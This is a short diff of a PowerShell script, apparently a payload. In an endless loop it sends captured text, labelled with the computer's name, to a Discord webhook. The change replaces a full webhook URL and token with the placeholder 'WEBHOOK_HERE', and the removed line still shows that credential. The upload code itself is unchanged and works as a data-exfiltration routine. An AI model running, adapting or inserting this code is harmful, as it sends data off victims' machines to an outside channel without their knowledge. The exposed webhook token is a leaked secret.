@@ -19,7 +19,7 @@ while ($true) {
     if ($result) {
         $results = $result.Text
         Write-Output $results
-        $dc = 'https://discord.com/api/webhooks/1176132406642757662/xCdVqng2X6cErTeiXkd8SO8tiu7oPJ9mOAUdDO9kcCHbM4xZGL6HUopf_adRv7DLeQQE'
+        $dc = 'WEBHOOK_HERE'
         $Body = @{'username' = $env:COMPUTERNAME ; 'content' = $results}
         irm -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
     }
